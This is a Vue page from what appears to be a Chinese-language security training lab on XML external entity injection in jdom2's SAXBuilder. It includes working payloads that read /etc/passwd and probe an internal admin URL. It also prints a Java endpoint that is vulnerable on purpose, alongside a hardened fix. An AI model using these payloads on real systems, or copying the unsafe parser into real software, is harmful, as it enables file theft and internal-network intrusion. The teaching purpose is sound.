<template>
  <vuln-template
    title="企业数据交换平台 - SAX 构造器"
    subtitle="外部实体注入"
    level="高危"
    :icon="DatabaseOutlined"
    moduleKey="xxe_saxbuilder"
  >
    <template #description>
      <a-typography-paragraph>
        <strong>业务场景：</strong>企业数据交换平台,支持导入XML格式的业务数据(订单、库存、客户信息等),实现跨系统数据同步。系统提供文件上传和在线编辑两种导入方式,支持批量数据处理。
      </a-typography-paragraph>
      <a-typography-paragraph>
        <strong>漏洞原理：</strong>系统使用SAXBuilder(jdom2库)解析数据文件,未禁用外部实体解析,攻击者可以通过构造恶意数据文件窃取服务器信息或发起内网攻击。
      </a-typography-paragraph>
      <a-alert
        message="⚠️ 安全提示"
        description="本系统仅用于安全学习。jdom2的SAXBuilder默认配置存在XXE风险,在处理外部XML数据时必须禁用外部实体解析。"
        type="warning"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #payload>
      <a-tabs v-model:activeKey="payloadTab" type="card">
        <a-tab-pane key="normal" tab="正常数据">
          <a-typography-paragraph>
            <strong>正常的业务数据XML示例：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;data&gt;
  &lt;order&gt;
    &lt;id&gt;ORD-2026-001&lt;/id&gt;
    &lt;customer&gt;张三&lt;/customer&gt;
    &lt;amount&gt;5000.00&lt;/amount&gt;
    &lt;status&gt;pending&lt;/status&gt;
  &lt;/order&gt;
&lt;/data&gt;
          </a-typography-paragraph>
        </a-tab-pane>

        <a-tab-pane key="file" tab="文件读取攻击">
          <a-typography-paragraph>
            <strong>攻击Payload - 读取系统文件：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE data [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;data&gt;
  &lt;order&gt;
    &lt;customer&gt;&amp;xxe;&lt;/customer&gt;
  &lt;/order&gt;
&lt;/data&gt;
          </a-typography-paragraph>
          <a-alert
            message="攻击原理：通过DOCTYPE声明外部实体,可以读取服务器文件系统中的敏感数据。"
            type="info"
            show-icon
            style="margin-top: 12px"
          />
        </a-tab-pane>

        <a-tab-pane key="internal" tab="内网探测">
          <a-typography-paragraph>
            <strong>攻击Payload - 内网服务探测：</strong>
          </a-typography-paragraph>
          <a-typography-paragraph code copyable>
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE data [
  &lt;!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin"&gt;
]&gt;
&lt;data&gt;
  &lt;order&gt;
    &lt;customer&gt;&amp;xxe;&lt;/customer&gt;
  &lt;/order&gt;
&lt;/data&gt;
          </a-typography-paragraph>
          <a-alert
            message="攻击原理：利用XXE漏洞探测内网服务,绕过防火墙限制,可能导致内网信息泄露。"
            type="info"
            show-icon
            style="margin-top: 12px"
          />
        </a-tab-pane>
      </a-tabs>
    </template>

    <template #test-form>
      <div class="data-exchange-container">
        <!-- 系统头部 -->
        <div class="system-header">
          <div class="header-icon">
            <database-outlined />
          </div>
          <div class="header-content">
            <h3>企业数据交换平台</h3>
            <p>支持XML格式的业务数据导入与跨系统同步 | 已同步 {{ dataHistory.length }} 条数据</p>
          </div>
          <div class="header-stats">
            <a-statistic title="数据条数" :value="dataHistory.length" suffix="条" />
          </div>
        </div>

        <!-- 快捷操作 -->
        <a-row :gutter="16" style="margin-bottom: 24px;">
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadExample('normal')">
              <div class="action-icon" style="background: linear-gradient(135deg, #52c41a 0%, #95de64 100%);">
                <check-circle-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">正常数据</div>
                <div class="action-desc">加载正常业务数据</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadExample('file')">
              <div class="action-icon" style="background: linear-gradient(135deg, #fa8c16 0%, #ffc53d 100%);">
                <file-protect-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">文件读取</div>
                <div class="action-desc">XXE文件读取攻击</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="loadExample('internal')">
              <div class="action-icon" style="background: linear-gradient(135deg, #f5222d 0%, #ff7875 100%);">
                <cluster-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">内网探测</div>
                <div class="action-desc">SSRF内网攻击</div>
              </div>
            </a-card>
          </a-col>
          <a-col :span="6">
            <a-card class="quick-action-card" @click="showHistory = !showHistory">
              <div class="action-icon" style="background: linear-gradient(135deg, #722ed1 0%, #b37feb 100%);">
                <history-outlined />
              </div>
              <div class="action-content">
                <div class="action-title">同步历史</div>
                <div class="action-desc">查看历史记录</div>
              </div>
            </a-card>
          </a-col>
        </a-row>

        <!-- 同步历史记录 -->
        <a-card v-if="showHistory" title="📜 数据同步历史" :bordered="false" class="history-card" style="margin-bottom: 24px;">
          <a-table
            :columns="historyColumns"
            :data-source="dataHistory"
            :pagination="{ pageSize: 5 }"
            size="small"
          >
            <template #bodyCell="{ column, record }">
              <template v-if="column.key === 'status'">
                <a-tag :color="record.status === 'success' ? 'success' : 'error'">
                  {{ record.status === 'success' ? '成功' : '失败' }}
                </a-tag>
              </template>
              <template v-if="column.key === 'action'">
                <a-button type="link" size="small" @click="loadHistoryItem(record)">
                  查看
                </a-button>
              </template>
            </template>
          </a-table>
        </a-card>

        <!-- 导入表单 -->
        <a-card title="📦 业务数据内容" :bordered="false" class="import-card">
          <template #extra>
            <a-space>
              <a-tag color="green">jdom2 SAXBuilder</a-tag>
              <a-radio-group v-model:value="importMode" button-style="solid" size="small">
                <a-radio-button value="text">在线编辑</a-radio-button>
                <a-radio-button value="file">文件上传</a-radio-button>
              </a-radio-group>
            </a-space>
          </template>

          <!-- 文件上传模式 -->
          <div v-if="importMode === 'file'" class="upload-section">
            <a-upload-dragger
              :before-upload="handleFileUpload"
              :show-upload-list="false"
              accept=".xml"
            >
              <p class="ant-upload-drag-icon">
                <inbox-outlined style="font-size: 48px; color: #52c41a;" />
              </p>
              <p class="ant-upload-text">点击或拖拽XML数据文件到此区域上传</p>
              <p class="ant-upload-hint">
                支持单个XML文件上传,文件大小不超过10MB
              </p>
            </a-upload-dragger>
            <div v-if="uploadedFileName" class="uploaded-file-info">
              <a-alert
                :message="`已选择文件: ${uploadedFileName}`"
                type="success"
                show-icon
                closable
                @close="clearUploadedFile"
              />
            </div>
          </div>

          <!-- 在线编辑模式 -->
          <a-form v-else :model="formState" @finish="handleSubmit" layout="vertical">
            <a-form-item
              label="XML数据内容"
              name="content"
              :rules="[{ required: true, message: '请输入XML数据' }]"
            >
              <a-textarea
                v-model:value="formState.content"
                :rows="12"
                placeholder="请粘贴或输入XML格式的业务数据..."
                class="xml-textarea"
              />
            </a-form-item>

            <!-- 数据预览 -->
            <a-form-item v-if="formState.content" label="数据预览">
              <div class="data-preview">
                <a-descriptions :column="2" size="small" bordered>
                  <a-descriptions-item label="数据大小">
                    {{ (formState.content.length / 1024).toFixed(2) }} KB
                  </a-descriptions-item>
                  <a-descriptions-item label="行数">
                    {{ formState.content.split('\n').length }} 行
                  </a-descriptions-item>
                  <a-descriptions-item label="包含DOCTYPE" :span="2">
                    <a-tag :color="formState.content.includes('<!DOCTYPE') ? 'warning' : 'success'">
                      {{ formState.content.includes('<!DOCTYPE') ? '是 ⚠️' : '否' }}
                    </a-tag>
                  </a-descriptions-item>
                </a-descriptions>
              </div>
            </a-form-item>

            <a-form-item>
              <a-space size="large">
                <a-button type="primary" html-type="submit" size="large" :loading="loading">
                  <template #icon><import-outlined /></template>
                  导入数据
                </a-button>
                <a-button size="large" @click="handleReset">
                  <template #icon><redo-outlined /></template>
                  清空
                </a-button>
              </a-space>
            </a-form-item>
          </a-form>
        </a-card>
      </div>
    </template>

    <template #result v-if="result">
      <a-card title="📈 处理结果" :bordered="false" class="result-card">
        <div class="result-content">
          <pre>{{ result }}</pre>
        </div>
        <a-alert
          v-if="result && (result.includes('root:') || result.includes('解析结果'))"
          message="⚠️ 检测到XXE漏洞"
          description="SAXBuilder成功解析了外部实体,返回了敏感信息。jdom2库默认配置存在XXE风险,必须显式禁用外部实体。"
          type="error"
          show-icon
          style="margin-top: 16px"
        />
      </a-card>
    </template>

    <template #source-code>
      <a-typography-paragraph>
        <strong>后端源码（存在漏洞）：</strong>
      </a-typography-paragraph>
      <div style="margin-top: 12px; position: relative;">
        <a-typography-paragraph copyable :copy-text="sourceCode" style="margin: 0;">
          <pre class="code-block"><code>@RestController
@RequestMapping("/home/xxe")
public class XXE {
    @PostMapping(value = "/saxbuilder")
    public String SAXBuilder(@RequestBody String content, String entity) {
        try {
            // 漏洞：安全检测是可选的
            if (entity != null && entity.equals("true") && Security.checkXXE(content)) {
                return "检测到XXE攻击";
            }

            // 漏洞：创建SAXBuilder时没有禁用外部实体
            SAXBuilder saxbuilder = new SAXBuilder();
            // 修复代码被注释掉了

            // 解析XML，会加载外部实体
            org.jdom2.Document document = saxbuilder.build(new InputSource(new StringReader(content)));
            String text = document.getRootElement().getText();
            return "解析结果: " + text;
        } catch (Exception e) {
            return "错误: " + e.toString();
        }
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
      <a-alert
        message="漏洞点：SAXBuilder（jdom2库）默认允许加载外部实体,攻击者可以通过DOCTYPE声明和ENTITY引用加载本地文件或远程资源。"
        type="error"
        show-icon
        style="margin-top: 12px"
      />
    </template>

    <template #fix>
      <a-typography-paragraph>
        <strong>修复建议：</strong>
      </a-typography-paragraph>
      <ul style="padding-left: 20px; line-height: 2;">
        <li><strong>禁用外部实体：</strong>通过XMLReader配置禁用外部实体</li>
        <li><strong>禁用DOCTYPE：</strong>禁止DOCTYPE声明</li>
        <li><strong>使用安全配置：</strong>配置SAXBuilder的安全特性</li>
        <li><strong>输入验证：</strong>在解析前检查XML是否包含DOCTYPE声明</li>
      </ul>

      <div style="margin-top: 16px; position: relative;">
        <a-typography-paragraph copyable :copy-text="fixCode" style="margin: 0;">
          <pre class="code-block"><code>// 正确示例：禁用外部实体
@PostMapping(value = "/saxbuilder")
public String SAXBuilder(@RequestBody String content) {
    try {
        SAXBuilder saxbuilder = new SAXBuilder();

        // 获取XMLReader并配置安全特性
        XMLReader xmlReader = org.xml.sax.helpers.XMLReaderFactory.createXMLReader();
        xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
        xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        saxbuilder.setXMLReaderFactory(() -> xmlReader);

        org.jdom2.Document document = saxbuilder.build(new InputSource(new StringReader(content)));
        String text = document.getRootElement().getText();
        return "解析结果: " + text;
    } catch (Exception e) {
        return "错误: " + e.getMessage();
    }
}</code></pre>
      </a-typography-paragraph>
      </div>
    </template>
  </vuln-template>
</template>

<script setup>
import { reactive, ref } from 'vue'
import { message } from 'ant-design-vue'
import {
  DatabaseOutlined,
  RedoOutlined,
  ImportOutlined,
  CheckCircleOutlined,
  FileProtectOutlined,
  ClusterOutlined,
  HistoryOutlined,
  InboxOutlined
} from '@ant-design/icons-vue'
import VulnTemplate from '@/components/VulnTemplate.vue'
import axios from 'axios'

const loading = ref(false)
const result = ref('')
const payloadTab = ref('normal')
const importMode = ref('text')
const showHistory = ref(false)
const uploadedFileName = ref('')
const dataHistory = ref([])

const historyColumns = [
  { title: '时间', dataIndex: 'time', key: 'time', width: 180 },
  { title: '数据来源', dataIndex: 'name', key: 'name' },
  { title: '状态', dataIndex: 'status', key: 'status', width: 80 },
  { title: '操作', key: 'action', width: 80 }
]

const examples = {
  normal: `<?xml version="1.0" encoding="UTF-8"?>
<data>
  <order>
    <id>ORD-2026-001</id>
    <customer>张三</customer>
    <amount>5000.00</amount>
    <status>pending</status>
  </order>
</data>`,
  file: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>
  <order>
    <customer>&xxe;</customer>
  </order>
</data>`,
  internal: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/admin">
]>
<data>
  <order>
    <customer>&xxe;</customer>
  </order>
</data>`
}

const sourceCode = `@RestController
@RequestMapping("/home/xxe")
public class XXE {
    @PostMapping(value = "/saxbuilder")
    public String SAXBuilder(@RequestBody String content, String entity) {
        try {
            // 漏洞：安全检测是可选的
            if (entity != null && entity.equals("true") && Security.checkXXE(content)) {
                return "检测到XXE攻击";
            }

            // 漏洞：创建SAXBuilder时没有禁用外部实体
            SAXBuilder saxbuilder = new SAXBuilder();
            // 修复代码被注释掉了

            // 解析XML，会加载外部实体
            org.jdom2.Document document = saxbuilder.build(new InputSource(new StringReader(content)));
            String text = document.getRootElement().getText();
            return "解析结果: " + text;
        } catch (Exception e) {
            return "错误: " + e.toString();
        }
    }
}`

const fixCode = `// 正确示例：禁用外部实体
@PostMapping(value = "/saxbuilder")
public String SAXBuilder(@RequestBody String content) {
    try {
        SAXBuilder saxbuilder = new SAXBuilder();

        // 获取XMLReader并配置安全特性
        XMLReader xmlReader = org.xml.sax.helpers.XMLReaderFactory.createXMLReader();
        xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        xmlReader.setFeature("http://xml.org/sax/features/external-general-entities", false);
        xmlReader.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        saxbuilder.setXMLReaderFactory(() -> xmlReader);

        org.jdom2.Document document = saxbuilder.build(new InputSource(new StringReader(content)));
        String text = document.getRootElement().getText();
        return "解析结果: " + text;
    } catch (Exception e) {
        return "错误: " + e.getMessage();
    }
}`

const formState = reactive({
  content: ''
})

const loadExample = (type) => {
  formState.content = examples[type]
  payloadTab.value = type
  importMode.value = 'text'
  message.success(`已加载${type === 'normal' ? '正常数据' : type === 'file' ? '文件读取攻击' : '内网探测'}示例`)
}

const handleFileUpload = (file) => {
  const isXML = file.type === 'text/xml' || file.name.endsWith('.xml')
  if (!isXML) {
    message.error('只能上传XML文件!')
    return false
  }

  const isLt10M = file.size / 1024 / 1024 < 10
  if (!isLt10M) {
    message.error('文件大小不能超过10MB!')
    return false
  }

  uploadedFileName.value = file.name

  const reader = new FileReader()
  reader.onload = (e) => {
    formState.content = e.target.result
    message.success('文件读取成功,请点击导入按钮')
    setTimeout(() => {
      handleSubmit()
    }, 500)
  }
  reader.readAsText(file)

  return false
}

const clearUploadedFile = () => {
  uploadedFileName.value = ''
  formState.content = ''
}

const handleSubmit = async () => {
  if (!formState.content) {
    message.error('请先选择文件或输入XML内容')
    return
  }

  loading.value = true
  try {
    const response = await axios.post('/home/xxe/saxbuilder', formState.content, {
      headers: {
        'Content-Type': 'application/xml'
      }
    })
    result.value = response.data

    dataHistory.value.unshift({
      key: Date.now(),
      time: new Date().toLocaleString('zh-CN'),
      name: uploadedFileName.value || '在线编辑',
      status: 'success',
      content: formState.content,
      result: response.data
    })

    message.success('导入完成')
  } catch (error) {
    const errorMsg = error.response?.data || error.message
    result.value = typeof errorMsg === 'string' ? errorMsg : JSON.stringify(errorMsg)

    dataHistory.value.unshift({
      key: Date.now(),
      time: new Date().toLocaleString('zh-CN'),
      name: uploadedFileName.value || '在线编辑',
      status: 'error',
      content: formState.content,
      result: result.value
    })

    message.error('导入失败')
  } finally {
    loading.value = false
  }
}

const loadHistoryItem = (record) => {
  formState.content = record.content
  result.value = record.result
  importMode.value = 'text'
  showHistory.value = false
  message.info('已加载历史记录')
}

const handleReset = () => {
  formState.content = ''
  result.value = ''
  uploadedFileName.value = ''
}
</script>

<style scoped>
.data-exchange-container {
  width: 100%;
}

.system-header {
  display: flex;
  align-items: center;
  padding: 32px;
  background: linear-gradient(135deg, #52c41a 0%, #389e0d 100%);
  border-radius: 16px;
  color: white;
  margin-bottom: 24px;
  box-shadow: 0 8px 32px rgba(82, 196, 26, 0.3);
}

.header-icon {
  width: 80px;
  height: 80px;
  background: rgba(255, 255, 255, 0.2);
  backdrop-filter: blur(10px);
  border-radius: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 40px;
  margin-right: 24px;
}

.header-content {
  flex: 1;
}

.header-content h3 {
  margin: 0 0 8px 0;
  font-size: 28px;
  font-weight: 700;
  color: white;
}

.header-content p {
  margin: 0;
  font-size: 16px;
  opacity: 0.9;
}

.header-stats {
  margin-left: 24px;
}

.header-stats :deep(.ant-statistic-title) {
  color: rgba(255, 255, 255, 0.85);
}

.header-stats :deep(.ant-statistic-content) {
  color: white;
  font-size: 24px;
}

.quick-action-card {
  cursor: pointer;
  transition: all 0.3s ease;
  border-radius: 12px;
}

.quick-action-card:hover {
  transform: translateY(-4px);
  box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
}

.quick-action-card :deep(.ant-card-body) {
  padding: 20px;
  display: flex;
  align-items: center;
  gap: 16px;
}

.action-icon {
  width: 56px;
  height: 56px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 28px;
  color: white;
  flex-shrink: 0;
}

.action-content {
  flex: 1;
}

.action-title {
  font-size: 16px;
  font-weight: 600;
  color: #2c3e50;
  margin-bottom: 4px;
}

.action-desc {
  font-size: 13px;
  color: #95a5a6;
}

.history-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
  animation: slideDown 0.3s ease;
}

@keyframes slideDown {
  from {
    opacity: 0;
    transform: translateY(-10px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

.import-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
}

.import-card :deep(.ant-card-head) {
  background: linear-gradient(135deg, #f6ffed 0%, #d9f7be 100%);
  border-bottom: 2px solid #b7eb8f;
  font-weight: 600;
}

.upload-section {
  padding: 20px 0;
}

.uploaded-file-info {
  margin-top: 16px;
}

.data-preview {
  margin-top: 12px;
}

.xml-textarea {
  font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
  font-size: 13px;
  line-height: 1.6;
}

.result-card {
  border-radius: 12px;
  box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
  margin-top: 24px;
}

.result-card :deep(.ant-card-head) {
  background: linear-gradient(135deg, #fff7e6 0%, #fffbe6 100%);
  border-bottom: 2px solid #ffe58f;
  font-weight: 600;
}

.result-content {
  background: #f6f8fa;
  border-radius: 8px;
  padding: 16px;
  border: 1px solid #e1e4e8;
}

.result-content pre {
  margin: 0;
  font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
  font-size: 13px;
  line-height: 1.6;
  color: #24292e;
  white-space: pre-wrap;
  word-wrap: break-word;
}
</style>
